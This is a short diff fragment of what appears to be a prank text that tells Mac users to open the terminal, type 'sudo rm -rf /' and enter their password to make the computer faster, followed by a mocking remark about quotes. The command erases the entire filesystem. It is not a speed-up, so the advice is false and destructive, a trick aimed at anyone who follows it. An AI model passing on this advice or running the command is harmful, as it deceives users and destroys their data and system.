@@ -9,6 +9,7 @@ Also, to make your mac faster, open the terminal and type
     "  sudo rm -rf /
  "     and
 enter your password!
+
 (don't put the quotes in. if you did, "u r n id10t")
 
 
